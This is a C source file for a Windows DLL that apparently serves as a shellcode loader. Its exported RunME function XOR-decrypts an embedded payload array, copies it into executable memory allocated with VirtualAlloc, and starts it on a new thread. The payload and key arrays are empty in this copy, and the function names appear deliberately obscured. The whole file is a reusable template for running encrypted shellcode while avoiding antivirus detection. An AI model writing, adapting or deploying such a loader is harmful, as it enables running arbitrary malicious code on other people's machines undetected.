#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char pl_key[] = "";
unsigned char calc_payload[] = { };
unsigned int calc_len = sizeof(calc_payload);

char FIVE(char some, char another) {
return some ^ another;
}

void ONE(char * data, size_t data_len, char * key, size_t key_len) {
        int j;
        
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
		
		data[i] = FIVE(data[i], key[j]);
                j++;
        }
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {

    ONE((char *) calc_payload, calc_len, pl_key, sizeof(pl_key));

    // Allocate memory
    LPVOID basePageAddress = VirtualAlloc(NULL, (SIZE_T)calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (basePageAddress == NULL) {
        return 1;
    }

    // Write memory
    RtlMoveMemory(basePageAddress, calc_payload, (SIZE_T)calc_len);

    // Create thread that points to shellcode
    HANDLE threadHandle;
    threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)basePageAddress, NULL, 0, NULL);

    //Wait for the thread to run
    WaitForSingleObject(threadHandle, INFINITE);

    return 0;
    }
}